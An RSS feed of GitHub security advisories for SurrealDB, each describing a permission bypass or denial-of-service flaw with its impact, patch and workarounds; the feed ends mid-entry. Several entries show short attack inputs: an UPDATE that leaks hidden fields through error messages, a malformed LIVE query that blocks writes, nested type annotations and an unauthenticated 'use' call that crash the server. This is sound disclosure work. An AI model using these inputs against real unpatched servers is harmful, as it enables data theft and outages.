<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2026-07-01T20:17:53.320Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: Authenticated callers can read fields hidden by field-level SELECT permissions via error messages]]></title>
        <id>https://github.com/advisories/GHSA-6g9v-7gq3-p2c6</id>
        <link href="https://github.com/advisories/GHSA-6g9v-7gq3-p2c6"/>
        <updated>2026-07-01T20:16:53.000Z</updated>
        <content type="html"><![CDATA[<p>A record user with UPDATE access could read field values that field-level SELECT permissions hid from them. Arithmetic operators and <code>extend</code> embedded the raw operand into their error messages, and UPDATE permission checks evaluate against the unreduced document — so triggering such an error against a hidden field returned its value in the resulting error.</p>
<h3 id="impact">Impact</h3>
<p>A record user issues an UPDATE that performs an incompatible operation against a hidden field — e.g. <code>UPDATE person:me SET probe = email + 1</code> when <code>email</code> is a string — and reads the value from the returned error (<code>Tried to compute "alice@example.com" + 1 …</code>). One field per operation, but the attacker can repeat against any field on any record they can UPDATE.</p>
<h3 id="patches">Patches</h3>
<p>A patch has been introduced that replaces the raw operand in every <code>try_*</code> operator and in <code>extend</code> with the operand's type name (<code>"string"</code>, <code>"int"</code>, <code>"array"</code>, etc.).</p>
<ul>
<li>Versions 3.1.0 and later are not affected by this issue.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Affected users who are unable to update should not grant UPDATE permission on records whose field-level SELECT permissions are expected to hide values from the same caller.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-6g9v-7gq3-p2c6">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-6g9v-7gq3-p2c6</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/0aaa332c79195e4c40275eb5224aed3d52f5cf90">https://github.com/surrealdb/surrealdb/commit/0aaa332c79195e4c40275eb5224aed3d52f5cf90</a></li>
<li><a href="https://github.com/advisories/GHSA-6g9v-7gq3-p2c6">https://github.com/advisories/GHSA-6g9v-7gq3-p2c6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6g9v-7gq3-p2c6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-01T20:16:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: LIVE query subscriptions survive session state changes, bypassing access controls]]></title>
        <id>https://github.com/advisories/GHSA-4m82-p8cx-f94j</id>
        <link href="https://github.com/advisories/GHSA-4m82-p8cx-f94j"/>
        <updated>2026-07-01T20:16:12.000Z</updated>
        <content type="html"><![CDATA[<p>A <code>LIVE SELECT</code> subscription records the user's auth state (<code>$auth</code>, <code>$token</code>, <code>$session</code>, <code>$access</code>) when it is registered, and the server uses that recorded state to evaluate the table- and row-level <code>PERMISSIONS</code> clauses for every subsequent notification. The recorded state is never refreshed. </p>
<p>When something changes the user's effective auth state — the originating session is invalidated, the session's TTL expires, or the user signs in, signs up, or authenticates as a different identity on the same connection — the subscription keeps delivering notifications under the old, stale auth state, and the <code>PERMISSIONS</code> that should now apply to the connection are never consulted.</p>
<h3 id="impact">Impact</h3>
<p>A user whose session has been revoked, expired, signed out of, or re-authenticated on the same connection continues to receive real-time notifications evaluated against the prior principal. The attacker does not gain access to new resources — only continued access to resources the prior principal was already permitted to read — but that continued access persists past the point the principal change should have ended it, and persists indefinitely until the originating connection is closed.</p>
<p>This is confidentiality-only: the dispatcher does not enable writes evaluated under the stranded principal.</p>
<h3 id="patches">Patches</h3>
<ul>
<li><strong><code>invalidate()</code> and TTL expiry</strong> — <code>RpcProtocol::invalidate</code> now calls <code>cleanup_lqs(session_id)</code> after clearing the session, dropping every LIVE owned by the now-invalidated session. The notification dispatcher additionally reads the originating session's <code>exp</code> and skips delivery once it has passed, closing the TTL-expiry leg without requiring the <code>Session</code> object to remain in memory.</li>
<li><strong>Principal change on <code>signin</code> / <code>signup</code> / <code>authenticate</code> / <code>refresh</code></strong> — each of these RPC methods now snapshots the session's auth principal (<code>Auth::id()</code> + <code>Auth::level()</code>) before mutating the session and, if the principal has changed after the operation, calls <code>cleanup_lqs(session_id)</code>. Token refresh against the same identity is therefore preserved; identity change tears stranded subscriptions down.</li>
</ul>
<p>Versions  3.1.0 and later are not affected by this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>For unpatched versions, clients should call <code>reset()</code> (which tears down all LIVE queries owned by the session) or <code>kill</code> each outstanding <code>live query ID</code> before signing out, signing in as a different identity, or signing up on an existing connection. There is no client-side workaround for the TTL-expiry leg; deployments concerned about it should restrict <code>DURATION FOR SESSION</code> on access methods that have permission to register LIVE queries.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-4m82-p8cx-f94j">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-4m82-p8cx-f94j</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/6cc48412c975d51b47617708ec44abc11ca5a89a">https://github.com/surrealdb/surrealdb/commit/6cc48412c975d51b47617708ec44abc11ca5a89a</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/cbec0a73dc9575994d2b9c1aec26af539dc99878">https://github.com/surrealdb/surrealdb/commit/cbec0a73dc9575994d2b9c1aec26af539dc99878</a></li>
<li><a href="https://github.com/advisories/GHSA-4m82-p8cx-f94j">https://github.com/advisories/GHSA-4m82-p8cx-f94j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4m82-p8cx-f94j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-01T20:16:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB vulnerable to pre-auth memory amplification via unbounded `/sql` WebSocket frames]]></title>
        <id>https://github.com/advisories/GHSA-65rj-r9fh-jp2v</id>
        <link href="https://github.com/advisories/GHSA-65rj-r9fh-jp2v"/>
        <updated>2026-07-01T20:15:04.000Z</updated>
        <content type="html"><![CDATA[<p>An anonymous caller could degrade <code>/sql</code> availability by streaming WebSocket frames many times larger than the operator-configured per-connection limit. The <code>/sql</code> upgrade handler accepted anonymous connections and did not propagate <code>SURREAL_WEBSOCKET_MAX_MESSAGE_SIZE</code> to the WebSocket protocol layer — incoming bytes accumulated in the per-connection read buffer before <code>check_anon</code> could reject the query, so the memory cost was incurred regardless of whether the caller could ever execute SurrealQL. The same upgrade path also silently ignored <code>--deny-http sql</code> and <code>--deny-arbitrary-query *</code> for authenticated callers, but that secondary effect does not grant new permissions.</p>
<h3 id="impact">Impact</h3>
<p><code>SURREAL_WEBSOCKET_MAX_MESSAGE_SIZE</code> is not applied to anonymous <code>/sql</code> connections, so each connection can buffer up to the WebSocket library defaults (16 MiB per frame, 64 MiB per reassembled message) of in-flight bytes regardless of the operator's configured limit. Holding this much memory pinned requires actively streaming bytes into the connection, so an attacker has to maintain bandwidth across many concurrent connections to consume meaningful memory. Within that constraint the result is degraded availability for legitimate <code>/sql</code> clients; on memory-constrained deployments the process may be OOM-killed and restarted during the attack rather than denied service outright.</p>
<p>Separately, <code>--deny-http sql</code> and <code>--deny-arbitrary-query *</code> were not enforced on the WebSocket, so SurrealQL operations the operator had configured to refuse could still be issued by any authenticated principal that already held the corresponding data permissions. This is a configuration-correctness defect — the bypass does not grant new permissions.</p>
<h3 id="patches">Patches</h3>
<p>A patch has been introduced that performs the two capability checks before calling <code>on_upgrade</code> and applies the same per-connection size limits used by <code>/rpc</code>. The capability checks enforce the operator's configured deny flags; they do not change what any authenticated principal is permitted to do.</p>
<ul>
<li>Versions 3.1.0 and later are not affected by this issue.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Affected users who are unable to update should refuse <code>GET /sql</code> requests carrying <code>Upgrade: websocket</code> at a reverse proxy, or apply per-connection frame size limits at the reverse proxy.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-65rj-r9fh-jp2v">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-65rj-r9fh-jp2v</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/899967e6a9cf064c88a4bc4b35ea7e2da28a6411">https://github.com/surrealdb/surrealdb/commit/899967e6a9cf064c88a4bc4b35ea7e2da28a6411</a></li>
<li><a href="https://github.com/advisories/GHSA-65rj-r9fh-jp2v">https://github.com/advisories/GHSA-65rj-r9fh-jp2v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-65rj-r9fh-jp2v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-01T20:15:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: Authorization Bypass in KILL Statement Allows Termination of Other Users' Live Queries]]></title>
        <id>https://github.com/advisories/GHSA-gcwr-5mrf-fvch</id>
        <link href="https://github.com/advisories/GHSA-gcwr-5mrf-fvch"/>
        <updated>2026-07-01T20:14:20.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>KILL</code> statement is used to terminate <code>LIVE SELECT</code> subscriptions that capture real-time changes to data within a table. The <code>KILL</code> statement implementation in <code>core/src/expr/statements/kill.rs</code> verifies that the requesting user has database-level access, but does not verify that the requesting user is the owner of the live query being terminated.</p>
<p>After passing the <code>valid_for_db()</code> check, the <code>KILL</code> statement resolves the live query UUID, looks up the corresponding live query entry, and immediately deletes it without comparing the requesting user's identity against the live query owner. This allows any authenticated user with database-level access to terminate any live query in that database, regardless of who created it.</p>
<p>The affected user's real-time subscription silently stops receiving updates with no notification that the live query was terminated. The same attack works across privilege levels: a low-privilege record-scoped user can terminate a root user's monitoring live queries.</p>
<p>This issue was discovered and patched during a code audit and penetration test of SurrealDB by cure53, the severity defined within cure53's preliminary finding is Medium, matched by our CVSS v3.1 assessment.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated user with database-level access can terminate any other user's live query subscriptions within the same database by issuing a <code>KILL</code> statement with the target live query's UUID. This impacts availability by silently disrupting real-time data subscriptions and breaks multi-tenant isolation guarantees.</p>
<p>The attack requires knowledge of the target live query UUID. Live query UUIDs are randomly generated, but may be exposed through application logs, shared monitoring dashboards, or other information disclosure vectors.</p>
<h3 id="patches">Patches</h3>
<p>An ownership verification check has been introduced in the <code>KILL</code> statement implementation that compares the requesting user's authentication context against the owner of the live query before allowing deletion.</p>
<ul>
<li>Versions 3.1.0 and later are not affected by this issue.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Users unable to upgrade should consider the following mitigations:</p>
<ul>
<li>Ensure that live query UUIDs are treated as sensitive values and are not exposed to other users through application logs, error messages, or shared interfaces.</li>
<li>Where multi-tenant isolation is critical, use separate databases per tenant rather than relying on record-level access controls within a shared database.</li>
<li>Monitor for unexpected termination of live queries in application logic and implement reconnection and re-subscription mechanisms.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-gcwr-5mrf-fvch">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-gcwr-5mrf-fvch</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/36f0a41a69b551172c7d1d13b1e8dbbd868e2ead">https://github.com/surrealdb/surrealdb/commit/36f0a41a69b551172c7d1d13b1e8dbbd868e2ead</a></li>
<li><a href="https://github.com/advisories/GHSA-gcwr-5mrf-fvch">https://github.com/advisories/GHSA-gcwr-5mrf-fvch</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gcwr-5mrf-fvch</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-01T20:14:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: Crafting malicious LIVE queries writes to the database, resulting in DoS, without permission to the table required]]></title>
        <id>https://github.com/advisories/GHSA-4v76-cw68-4vc9</id>
        <link href="https://github.com/advisories/GHSA-4v76-cw68-4vc9"/>
        <updated>2026-07-01T20:13:39.000Z</updated>
        <content type="html"><![CDATA[<p>A <code>LIVE</code> query whose <code>WHERE</code> clause evaluates to an error caused the source data modifier (the user creating, updating, or deleting a record on the watched table) to fail instead. Calling any arbitrary SurrealQL function with a typed parameter and passing a value of the wrong type — for example <code>LIVE SELECT * FROM t WHERE string::trim(deny)</code> — triggered an evaluation error inside the LIVE notification path. That error then propagated through to the triggering write, rolling back the attempted change.</p>
<p>While such a <code>LIVE</code> query was registered, all <code>CREATE</code>, <code>UPDATE</code>, and <code>DELETE</code> operations on the watched table failed — including those issued by a root user — for as long as the registration remained active. Registering the <code>LIVE</code> required <code>select</code> permission on the table; no other permission on the table was needed.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated user with <code>select</code> permission on a table can prevent all <code>CREATE</code>, <code>UPDATE</code>, and <code>DELETE</code> operations on that table — by any other user, up to and including root — for the lifetime of a single registered <code>LIVE</code> query. Service is restored when the <code>LIVE</code> query is killed or the session that registered it ends.</p>
<h3 id="patches">Patches</h3>
<p>A patch has been introduced that:</p>
<ol>
<li><strong>Decouples LIVE query evaluation errors from the source transaction</strong> — when <code>lq_check</code> returns an error during the LIVE notification path, the error is now reported to the LIVE subscriber as an <code>Action::Error</code> notification and the LIVE processing path returns <code>Ok(())</code>. The triggering write proceeds normally.</li>
<li><strong>Defers the error notification until after the permission check</strong> — the <code>Action::Error</code> notification is only delivered after the LIVE subscription's <code>PERMISSIONS</code> clause has been evaluated, so unauthorised subscribers do not learn even that an error occurred (closing an information-disclosure side channel introduced by the first part of the fix).</li>
</ol>
<ul>
<li>Versions 3.1.0 and later are not affected by this issue.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Users unable to upgrade should restrict the ability of untrusted users to register <code>LIVE</code> queries by removing the <code>select</code> permission on tables they want to keep writeable, or by gating LIVE registration at the application layer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-4v76-cw68-4vc9">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-4v76-cw68-4vc9</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/af835eb199ad2327a04c42101d11aff21fce7e47">https://github.com/surrealdb/surrealdb/commit/af835eb199ad2327a04c42101d11aff21fce7e47</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/b29e03f0714d1c4ec091fc6f27f1edbe243b8aec">https://github.com/surrealdb/surrealdb/commit/b29e03f0714d1c4ec091fc6f27f1edbe243b8aec</a></li>
<li><a href="https://github.com/advisories/GHSA-4v76-cw68-4vc9">https://github.com/advisories/GHSA-4v76-cw68-4vc9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4v76-cw68-4vc9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-01T20:13:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB has an Authorization Bypass via Composite Record-id Paths]]></title>
        <id>https://github.com/advisories/GHSA-6vg3-hgrw-p5gf</id>
        <link href="https://github.com/advisories/GHSA-6vg3-hgrw-p5gf"/>
        <updated>2026-07-01T20:12:26.000Z</updated>
        <content type="html"><![CDATA[<p>An authenticated user could bypass permission rules that gated access on parts of a record's id — most commonly tenant-isolation rules of the form <code>PERMISSIONS FOR select WHERE id.tenant = $auth.id.tenant</code>. The same defect also let UNIQUE constraints defined on parts of an id admit duplicate entries.</p>
<p>When a query referenced part of a composite record id (<code>id.tenant</code>, <code>id.uid</code>, …), SurrealDB read the value from the record's editable body fields instead of from the immutable id key. Because the body is editable but the id is fixed at creation, an attacker with write access could set the body field to any value and have permission checks read that spoofed value.</p>
<h3 id="impact">Impact</h3>
<p>What an attacker <strong>can</strong> do:</p>
<ul>
<li>Read records hidden by permission rules of the form <code>id.&lt;field&gt; = $auth.&lt;...&gt;</code> (typically tenant- or scope-isolation boundaries) by writing the same-named field on a record they control to the spoofed value.</li>
<li>Cause UNIQUE constraints defined on <code>id.&lt;field&gt;</code> to silently admit duplicate entries, leaving the database with rows that violate the constraint.</li>
</ul>
<p>What it <strong>can't</strong> do:</p>
<ul>
<li>Cross namespace or database isolation boundaries.
-Bypass field-level <code>PERMISSIONS FOR</code> update clauses that don't reference <code>id.&lt;field&gt;</code> paths.</li>
<li>Affect availability or crash the server.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The value-path resolver now special-cases <code>Part::Field</code> and <code>Part::Value</code> against <code>RecordIdKey::Object</code>, reading the named component directly from the id key without ever entering <code>select_document</code>. The Array-keyed special case (<code>id[0]</code>, <code>id[1]</code>, …) is unchanged.</p>
<ul>
<li>Versions 3.1.0 and later are not affected.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Users unable to patch are advised to consider the following workarounds:</p>
<ul>
<li>Avoid permission expressions that read <code>id.&lt;field&gt;</code> on Object-keyed record ids; gate on the full record id (<code>id = $auth.id</code>) or on a server-derived session value instead.</li>
<li>Avoid UNIQUE indexes on <code>id.&lt;field&gt;</code> until 3.1.0; use <code>DEFINE INDEX ... ON FIELDS id UNIQUE</code> (the full id) where possible.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-6vg3-hgrw-p5gf">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-6vg3-hgrw-p5gf</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/1fcb19040bfffba92b3f69edb9b707d469e0027b">https://github.com/surrealdb/surrealdb/commit/1fcb19040bfffba92b3f69edb9b707d469e0027b</a></li>
<li><a href="https://github.com/advisories/GHSA-6vg3-hgrw-p5gf">https://github.com/advisories/GHSA-6vg3-hgrw-p5gf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6vg3-hgrw-p5gf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-01T20:12:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: Graph traversal bypasses table SELECT permissions]]></title>
        <id>https://github.com/advisories/GHSA-vjjx-rfw4-rmfc</id>
        <link href="https://github.com/advisories/GHSA-vjjx-rfw4-rmfc"/>
        <updated>2026-07-01T20:10:35.000Z</updated>
        <content type="html"><![CDATA[<p>An authenticated record or scope user could read records on any table reachable through a graph edge or <code>REFERENCES TO</code> back-reference, regardless of that table's <code>PERMISSIONS FOR select</code> clause.</p>
<p>Traversing <code>SELECT * FROM source-&gt;edge-&gt;target</code> returned full documents from <code>target</code> even when <code>target</code> was defined as <code>PERMISSIONS FOR select NONE</code>. The same bypass extended through multi-hop chains, so any table reachable by a sequence of edges from a readable starting point was exposed.</p>
<p>The root cause: <code>GraphEdgeScan</code> and <code>ReferenceScan</code> fetched records straight from storage without routing them through <code>Document::pluck_select</code>, so the target table's permission expression was never consulted.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated record or scope user can read records on any table reachable through a chain of graph edges or back-references from a table they have <code>select</code> on, regardless of the target's <code>PERMISSIONS FOR select</code> clause. Confidentiality-only and bounded to the caller's current database — namespace and database isolation are unaffected.</p>
<h3 id="patches">Patches</h3>
<p>A new per-batch permission cache (<code>exec::permission::CachedTableSelect</code>) resolves each target table's <code>SELECT</code> permission once and filters yielded values through <code>check_permission_for_value</code>, matching the regular <code>SELECT</code> code path.</p>
<ul>
<li>Versions 3.1.0 and later are not affected.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Remove <code>select</code> permission on edge tables whose targets should be hidden.</li>
<li>Use namespace or database isolation as the primary boundary where feasible.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-vjjx-rfw4-rmfc">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-vjjx-rfw4-rmfc</a></li>
<li><a href="https://github.com/advisories/GHSA-vjjx-rfw4-rmfc">https://github.com/advisories/GHSA-vjjx-rfw4-rmfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjjx-rfw4-rmfc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-01T20:10:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: Scraping a TABLE with no available PERMISSIONS to current auth level]]></title>
        <id>https://github.com/advisories/GHSA-98fx-66cf-fc7c</id>
        <link href="https://github.com/advisories/GHSA-98fx-66cf-fc7c"/>
        <updated>2026-07-01T20:06:09.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was discovered where the user-supplied <code>WHERE</code> clause in a <code>SELECT</code> statement is evaluated against the full record data before <code>PERMISSIONS FOR SELECT WHERE</code> determines whether the principal is authorised to access that record. A side-effecting expression in the <code>WHERE</code> clause can exfiltrate record contents before the permission check runs. The same ordering bug affects the <code>SET</code>, <code>MERGE</code>, <code>CONTENT</code> and <code>PATCH</code> clauses of update-variant statements (<code>UPDATE</code>, <code>UPSERT-update</code>, <code>INSERT ON DUPLICATE KEY UPDATE</code>, <code>RELATE-update</code>).</p>
<p>This vulnerability is confined to the attacker's current database. It does not cross namespace or database isolation boundaries.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated user — including Record and Scope users — can read the full contents of any table in the database they are authenticated against, bypassing <code>PERMISSIONS FOR SELECT WHERE</code> restrictions on those tables.</p>
<p>The most direct exfiltration method requires scripting functions to be enabled (<code>--allow-scripting</code> / <code>-A</code>). However, exfiltration via SurrealQL's <code>THROW</code> statement is also feasible without scripting functions, and timing-based side-channel extraction is possible in all configurations.</p>
<p>All tables within the attacker's current database, regardless of table-level <code>PERMISSIONS FOR SELECT WHERE</code> restrictions on those tables, are vulnerable to this attack. Tables in other databases within the same namespace, or within other namespaces, are not vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>A patch has been introduced that runs <code>check_permissions_table</code> before any user-supplied expression is evaluated against the record. A new <code>check_pre_update</code> helper centralises this ordering on every update-variant code path. Regression tests covering <code>WHERE</code>, <code>SET</code>, <code>MERGE</code>, <code>CONTENT</code>, <code>INSERT ON DUPLICATE KEY UPDATE</code>, and <code>RELATE</code> with <code>THROW</code> side-effects are included.</p>
<ul>
<li>Versions 3.1.0 and later are not affected by this issue.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Affected users who are unable to update may want to:</p>
<ul>
<li><strong>Disable scripting functions</strong> if not required — remove the <code>-A</code> / <code>--allow-scripting</code> flag. This blocks the most direct exfiltration method but does not fully mitigate the vulnerability, as <code>THROW</code>-based and timing-based exfiltration remain possible.</li>
<li><strong>Limit query access</strong> — restrict the ability of untrusted principals to run arbitrary <code>SELECT</code> queries with user-controlled <code>WHERE</code> clauses.</li>
<li><strong>Use namespace/database isolation</strong> instead of table-level permissions as the primary security boundary where feasible, since the vulnerability is in table-level permission enforcement, not namespace or database isolation.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-98fx-66cf-fc7c">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-98fx-66cf-fc7c</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/500f4060349580b9cbb9c07b8112a487551c4616">https://github.com/surrealdb/surrealdb/commit/500f4060349580b9cbb9c07b8112a487551c4616</a></li>
<li><a href="https://github.com/advisories/GHSA-98fx-66cf-fc7c">https://github.com/advisories/GHSA-98fx-66cf-fc7c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-98fx-66cf-fc7c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-01T20:06:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB vulnerable to Denial of Service due to nested types annotations]]></title>
        <id>https://github.com/advisories/GHSA-q8qp-67f9-wr3f</id>
        <link href="https://github.com/advisories/GHSA-q8qp-67f9-wr3f"/>
        <updated>2026-07-01T20:05:15.000Z</updated>
        <content type="html"><![CDATA[<p>The SurrealDB type/kind parser did not enforce the configured recursion depth limit when parsing nested type annotations. The expression parser already enforced the limit for analogous constructs; the kind parser omitted it. An authenticated attacker could send a query with deeply nested type annotations (e.g., <code>array&lt;option&lt;array&lt;option&lt;...&gt;&gt;&gt;&gt;</code>) and exhaust server memory, crashing the process.</p>
<p>This is an incomplete fix for <a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-6r8p-hpg7-825g">GHSA-6r8p-hpg7-825g</a>, which addressed the same class of bug in the expression parser but did not cover the kind/type annotation parser code path.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated user with query execution privileges can crash a SurrealDB server with a single WebSocket message containing deeply nested type annotations.</p>
<h3 id="patches">Patches</h3>
<p>A patch has been introduced that wraps <code>parse_concrete_kind</code> and the <code>OPTION&lt;...&gt;</code> arm of <code>parse_inner_kind</code> with <code>enter_object_recursion!</code>, bounding the recursive cycle <code>parse_concrete_kind → parse_inner_kind → parse_inner_single_kind → parse_concrete_kind</code> at the configured <code>object_recursion_limit</code> (default 100). Regression tests cover both cast and <code>DEFINE FIELD</code> paths.</p>
<ul>
<li>Versions 3.1.0 and later are not affected by this issue.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Restrict the ability of untrusted users to execute arbitrary queries via the <code>--deny-arbitrary-query</code> capability flag for the affected user classes (guest, record, or system). Disabling untrusted access to the WebSocket <code>/rpc</code> endpoint also prevents exploitation; the HTTP <code>/sql</code> endpoint's 1 MiB body limit constrains nesting to a depth where OOM is not feasible.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-q8qp-67f9-wr3f">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-q8qp-67f9-wr3f</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/61d509b766afdf67cc26d8203fd7dc583c8d77aa">https://github.com/surrealdb/surrealdb/commit/61d509b766afdf67cc26d8203fd7dc583c8d77aa</a></li>
<li><a href="https://github.com/advisories/GHSA-q8qp-67f9-wr3f">https://github.com/advisories/GHSA-q8qp-67f9-wr3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8qp-67f9-wr3f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-01T20:05:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB has unauthenticated remote DoS via malformed RPC `use` call]]></title>
        <id>https://github.com/advisories/GHSA-wjjj-24cx-f28g</id>
        <link href="https://github.com/advisories/GHSA-wjjj-24cx-f28g"/>
        <updated>2026-07-01T20:04:23.000Z</updated>
        <content type="html"><![CDATA[<p>A single unauthenticated WebSocket message to <code>/rpc</code> crashed the SurrealDB server. Sending <code>use { db: "x" }</code> without first selecting a namespace hit <code>.expect("namespace should be set")</code> in the <code>use</code> handler; because <code>surrealdb-core</code> is built with <code>panic = 'abort'</code>, the panic terminated the process. <code>use</code> is callable before <code>signin</code>, and the per-method capability check passes by default for guest callers — so no credentials, token, or <code>--allow-guests</code> flag are required.</p>
<h3 id="impact">Impact</h3>
<p>An unauthenticated remote attacker who could reach the <code>/rpc</code> endpoint could crash the SurrealDB server with a single WebSocket message. No credentials, token, session knowledge, or capability are required.</p>
<h3 id="patches">Patches</h3>
<p>A patch has been introduced that returns a typed <code>invalid_params</code> response when <code>db</code> is set on a session with no <code>ns</code>, replacing the panic.</p>
<ul>
<li>Versions 3.1.0 and later are not affected by this issue.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Affected users who are unable to update should restrict network access to the <code>/rpc</code> endpoint to trusted clients, and run SurrealDB under a process supervisor that restarts on crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-wjjj-24cx-f28g">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-wjjj-24cx-f28g</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/1537ec4fbd789c61a5b43b648a854577dbe31a34">https://github.com/surrealdb/surrealdb/commit/1537ec4fbd789c61a5b43b648a854577dbe31a34</a></li>
<li><a href="https://github.com/advisories/GHSA-wjjj-24cx-f28g">https://github.com/advisories/GHSA-wjjj-24cx-f28g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wjjj-24cx-f28g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-01T20:04:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB has Denial of Service in JSON parser due to nested objects]]></title>
